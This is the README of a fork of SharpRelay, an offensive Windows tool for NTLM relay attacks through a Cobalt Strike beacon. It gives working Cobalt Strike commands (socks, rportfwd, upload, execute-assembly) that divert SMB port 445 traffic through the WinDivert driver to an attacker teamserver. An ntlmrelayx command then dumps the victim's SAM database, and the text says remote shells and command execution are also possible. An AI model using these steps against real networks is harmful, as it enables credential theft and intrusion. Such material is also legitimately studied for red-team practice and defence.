## Changes

This is a fork of [SharpRelay](https://github.com/pkb1s/SharpRelay) and contains an added watchdog to restart crashed threads.

## Usage

The only requirement for this attack to work is to have a beacon with **local administrator** privileges or with the ability to load drivers. The attack using SharpRelay works as follows:

* Upload the **signed** WinDivert driver into any folder on the compromised host
* Run SharpRelay to modify the destination port of the incoming packets on port 445 and redirect them to another port (e.g. 8445)
* From our beacon run the Cobalt Strike's `rportfwd` command to forward port 8445 of the compromised host to our teamserver's port 445.
* Start a socks server to forward the relayed traffic back to the victim network
* Run Impacket's ntlmrelayx with proxychains to do the SMB relay
* When a victim tries to access port 445 of the compromised host the NTLM authentication will be forwarded to our teamserver and relayed to another machine

The following example commands can be run from Cobalt Strike to perform these actions:

```
socks 4444
rportfwd 8445 127.0.0.1 445
cd C:\Users\victim
upload /root/Desktop/intercept.sys
execute-assembly /root/Desktop/SharpRelay.exe fakeservice C:\Users\victim\intercept.sys 445 8445
```

When all the above execute successfully you need to start your relay server (configure proxychains to the port specified in the above commands, e.g. 4444):

```
proxychains ntlmrelayx.py -t smb://<VICTIM-IP> -smb2support
```

The above command will dump the SAM database from the victim host. It is also possible to gain an interactive SMB shell as well as execute commands remotely on the victim.

SharpRelay has been tested against Win10 x64.

## Build Instructions

If you want to build the tool from source you can do the following:

* Clone the repo

* Ensure you can see all NuGet packages in the Installed tab by opening Project->Manage NuGet Packages in Visual Studio

* Build project

The above instructions have been tested using Visual Studio 2019.

## Technical Details

SharpRelay is based on the [WinDivert](https://github.com/basil00/Divert) driver. According to it's description, WinDivert is a kernel driver that allows for user-mode packet interception and modification. The user needs to specify a filter and any packets that match this filter will be intercepted and can be modified. 

From the ReadMe file:

```
The WinDivert.sys driver is installed below the Windows network stack.  The
following actions occur:

(1) A new packet enters the network stack and is intercepted by WinDivert.sys
(2a) If the packet matches the PROGRAM-defined filter, it is diverted.  The
    PROGRAM can then read the packet using a call to WinDivertRecv().
(2b) If the packet does not match the filter, the packet continues as normal.
(3) PROGRAM either drops, modifies, or re-injects the packet.  PROGRAM can
    re-inject the (modified) using a call to WinDivertSend().
```

For us, them most important thing that WinDivert allows us to do is that we can intercept traffic going to an open Windows port and redirect it to another port by modifying the TCP source and destination ports of each packet, recalculating the TCP checksums and reinjecting the packets into the network stack.

On Windows, port 445 is always running by default. I won't go into detail about the process using port 445 because this is already analysed in the following post, so please go ahead and read it:

* https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/

The above post also contains another interesting idea. Using WinDivert to perform an SMB relay attack via Metasploit. You can upload a few DLLs and a driver file to the target host along with the divertTCPconn.exe and execute them. I found this attack to be awesome, but what I didnt like was that you had to upload multiple DLLs on the target host. 

So my goal was to do the same attack by dropping the minimum amount of files on disk and also executing the attack through Cobalt Strike.

First of all, I wanted to make use of Cobalt Strike's `execute-assembly` function so I decided to write my code using the .NET framework. My initial thought would be to re-write divertTCPconn in C# and then everything would work. It turns out that this was very complicated. Fortunately, I found the following NuGet package written by TechnikEmpire:

* https://github.com/TechnikEmpire/WinDivertSharp

Using WinDivertSharp, I was able to write SharpRelay to load the driver by creating a service and communicate with the WinDivert driver to perform any packet modification I needed. 
